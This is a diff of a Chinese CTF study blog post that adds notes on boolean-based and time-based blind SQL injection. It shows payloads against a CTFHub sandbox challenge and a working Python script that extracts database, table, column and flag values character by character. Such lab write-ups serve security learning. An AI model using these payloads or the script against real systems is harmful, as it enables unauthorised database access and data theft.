@@ -481,14 +481,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    2.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    12 分
                 </div>
                 
 
@@ -630,6 +630,138 @@ select 1,2,(extractvalue(1,concat(0x7e,(select table_name from information_schem
 </li>
 <li><p>然后就爆完了</p>
 </li>
+</ol>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ol>
+<li>所谓盲注就是在服务器没有错误回显的时候完成注入攻击。</li>
+<li>原理：boolean 根据注入信息返回true or fales 没有任何报错信息</li>
+<li>即布尔盲注一般适用于页面没有回显字段(不支持联合查询)，<strong>且web页面返回True或者false</strong>，构造SQL语句，<strong>利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false</strong>，从而达到注入的目的来<strong>获取信息</strong>的一种方法</li>
+</ol>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre class="line-numbers language-none"><code class="language-none">playload：and length(database()) &#x3D;8 --+ &#x2F;判断数据库名长度
+是否等于8
+如果不等于
+则返回错
+等于的话就是开始页面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ol>
+<li>如果是错误，会回显报错</li>
+<li>如果是正确的，会返回开始页面</li>
+</ol>
+<h3 id="例题：ctfhub布尔盲注"><a href="#例题：ctfhub布尔盲注" class="headerlink" title="例题：ctfhub布尔盲注"></a>例题：ctfhub布尔盲注</h3><ol>
+<li>这一道题我看其它人的wp是数据库为空时还会返回空，一般情况下是数据库为空或者查询语句报错时都会报错，所以应该先判断空时是否会报错?id=1 and 0=1 –+</li>
+<li><strong>判断数据库名字的长度</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and length(database()) = 3 –+<br><img src="https://s2.loli.net/2022/06/30/hSZvJtQV8sMkuHy.png"></li>
+<li><strong>判断数据库名字的长度</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and length(database()) = 4 –+<br><img src="https://s2.loli.net/2022/06/30/hSZvJtQV8sMkuHy.png"></li>
+<li><strong>判断数据库名字</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and database() = ‘sqli’ –+<br><img src="https://s2.loli.net/2022/06/30/Y9RJbZPQgTdApBn.png"></li>
+<li><strong>判断数据库中表的名字</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and (select table_name from information_schema.tables where table_schema=’sqli’ limit 0,1) = ‘flag’ –+ 这个地方加limit 0,1是因为不只有一个表<br><img src="https://s2.loli.net/2022/06/30/1CJVp3ueS5MZlbf.png"></li>
+<li><strong>判断flag表中字段的名字</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and (select column_name from information_schema.columns where table_name=’flag’ limit 0,1) = ‘flag’ –+<br><img src="https://s2.loli.net/2022/06/30/rXfJiRvAY9UZT62.png"></li>
+<li>后面实在是写不出来了，就跑一下吧<pre class="line-numbers language-none"><code class="language-none">import requests
+import time
+
+urlOPEN &#x3D; &#39;http:&#x2F;&#x2F;challenge-80bbba4d1e9ce716.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;&#39;
+starOperatorTime &#x3D; [] 
+mark &#x3D; &#39;query_success&#39;
+ 
+def database_name():
+	name &#x3D; &#39;&#39;
+	for j in range(1,9):
+		for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:
+			url &#x3D; urlOPEN+&#39;if(substr(database(),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(j,i)
+			# print(url+&#39;%23&#39;)
+			r &#x3D; requests.get(url)
+			if mark in r.text:
+				name &#x3D; name+i
+				
+				print(name)
+				
+				break
+	print(&#39;database_name:&#39;,name)
+	
+		
+	
+database_name()
+ 
+def table_name():
+    list &#x3D; []
+    for k in range(0,4):
+        name&#x3D;&#39;&#39;
+        for j in range(1,9):
+            for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:
+                url &#x3D; urlOPEN+&#39;if(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit %d,1),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(k,j,i)
+			    # print(url+&#39;%23&#39;)
+                r &#x3D; requests.get(url)
+                if mark in r.text:
+                    name &#x3D; name+i
+                    break
+        list.append(name)
+    print(&#39;table_name:&#39;,list)
+
+#start &#x3D; time.time()
+table_name()
+#stop &#x3D; time.time()
+#starOperatorTime.append(stop-start)
+#print(&quot;所用的平均时间： &quot; + str(sum(starOperatorTime)&#x2F;100))
+
+def column_name():
+    list &#x3D; []
+    for k in range(0,3): #判断表里最多有4个字段
+        name&#x3D;&#39;&#39;
+        for j in range(1,9): #判断一个 字段名最多有9个字符组成
+            for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:
+                url&#x3D;urlOPEN+&#39;if(substr((select column_name from information_schema.columns where table_name&#x3D;&quot;flag&quot;and table_schema&#x3D; database() limit %d,1),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(k,j,i)
+                r&#x3D;requests.get(url)
+                if mark in r.text:
+                    name&#x3D;name+i
+                    break
+        list.append(name)
+    print (&#39;column_name:&#39;,list)
+
+column_name()
+
+def get_data():
+        name&#x3D;&#39;&#39;
+        for j in range(1,50): #判断一个值最多有51个字符组成
+            for i in range(48,126):
+                url&#x3D;urlOPEN+&#39;if(ascii(substr((select flag from flag),%d,1))&#x3D;%d,1,(select table_name from information_schema.tables))&#39; %(j,i)
+                r&#x3D;requests.get(url)
+                if mark in r.text:
+                    name&#x3D;name+chr(i)
+                    print(name)
+                    break
+        print (&#39;value:&#39;,name)
+    
+get_data()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>最后用这个脚本跑出来了<h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><pre class="line-numbers language-none"><code class="language-none">一.
+1.count()函数：统计查询结果的数量；
+2.length(str)函数：返回字符串 str的长度；
+3.left()函数： left(database(),1)&#x3D;‘s’ left(a,b)从左侧截取a的前b位，正确则返回1，错误返回0
+left((select database()),1)&#x3D;‘s’ 同样的意思
+4.regexp : select user() regexp ‘r’; user()的结果是root@localhost，regexp为匹配root的正则表达式
+5.like : select user() like ‘ro%’; 匹配与regexp相似
+6.substr(a,b,c): select substr() xxxx; substr(a,b,c)从位置b开始，截取a字符串的c位长度
+7.mid(a,b,c): select mid(user(),1,2); mid(a,b,c)从位置b开始，截取a字符串的c位长度
+8.ascii() 将某个字符转化为其ascii值
+9.limit 0,1：元素索引是从0开始（不是1） 从元素索引位置为1的数据（即第2位）开始输出一个值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ol>
+<li>由于服务器端拼接了SQL语句，且正确和错误存在同样的回显，即是错误信息被过滤，可以通过页面响应时间进行按位判断数据。由于时间盲注中的函数是在数据库中执行的，但是sleep函数或者benchmark函数的过多执行会让服务器负载过高</li>
+</ol>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol>
+<li>通过一个页面加载的时间延时来判断</li>
+<li>但是这和网络，性能，设置的延时长短有关系</li>
+<li>当对数据库进行查询操作，如果查询的条件不存在，语句执行的速度非常快，执行时间基本可以认为是0，通过控制sql语句的执行时间来判断</li>
+<li>我认为就是后端设置，当不设置查询条件时，语句执行就会非常快，执行时间基本可以认为是0，后端设置了不到多少时间的查询就不会显示数据</li>
+</ol>
+<h3 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h3><h4 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h4><h4 id="if-exp1-exp2-exp3"><a href="#if-exp1-exp2-exp3" class="headerlink" title="if(exp1,exp2,exp3)"></a>if(exp1,exp2,exp3)</h4><ol>
+<li>当exp1的值为true时会执行exp2,否则会执行exp3</li>
+</ol>
+<h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><ol>
+<li>睡眠函数，可以使查询数据时回显数据的相应时间加长</li>
+<li>sleep(N) 这里N是睡眠的时间</li>
+<li>使用时可以配合if使用<pre class="line-numbers language-none"><code class="language-none">if(ascii(substr(user(),1,1)) &#x3D; 114,sleep(5),2) 这句话的意思是，如果user()中的第一个字符的ascii码为114时，睡眠5s，否则输出2，需要注意的是，这5s是在服务器的数据库中延迟的，实际情况可能会由于网络环境等因素延迟更长时间<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<h4 id="benchmark函数"><a href="#benchmark函数" class="headerlink" title="benchmark函数"></a>benchmark函数</h4><ol>
+<li>benchmark函数原本是用来重复执行某个语句的函数</li>
+<li>benchmark(N,expression)</li>
+<li>N是执行的次数，expression是表达式，如果需要进行盲注，通常需要进行消耗时间和性能的计算，例如哈希计算函数MD5，将MD5函数重复执行数万次则可以达到延迟的效果，而具体的情况西药根据不同比赛的服务器性能来决定</li>
 </ol>
 
                 
@@ -977,12 +1109,12 @@ select 1,2,(extractvalue(1,concat(0x7e,(select table_name from information_schem
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ing/">
-                        <span class="chip bg-color">ing</span>
-                    </a>
-                    
                     <a href="/tags/CTF/">
                         <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/ing/">
+                        <span class="chip bg-color">ing</span>
                     </a>
                     
                     <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
@@ -1185,7 +1317,7 @@ select 1,2,(extractvalue(1,concat(0x7e,(select table_name from information_schem
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">48.6k</span>&nbsp;字
+                class="white-color">51.1k</span>&nbsp;字
             
             
             
